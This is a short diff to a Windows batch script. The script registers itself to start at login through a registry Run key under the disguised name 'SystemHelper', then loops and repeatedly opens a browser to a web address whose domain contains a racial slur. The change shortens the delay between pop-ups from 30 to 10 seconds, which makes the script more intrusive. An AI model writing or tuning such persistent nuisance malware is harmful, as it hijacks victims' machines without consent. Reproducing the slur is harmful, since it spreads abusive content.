@@ -13,7 +13,7 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHelper" /
     tasklist /fo csv | findstr /i ".exe" > nul
     if %errorlevel% equ 0 (
         start "" "https://niggafart.com"
-        timeout /t 30 /nobreak > nul
+        timeout /t 10 /nobreak > nul
     )
     timeout /t 5 /nobreak > nul
 goto loop
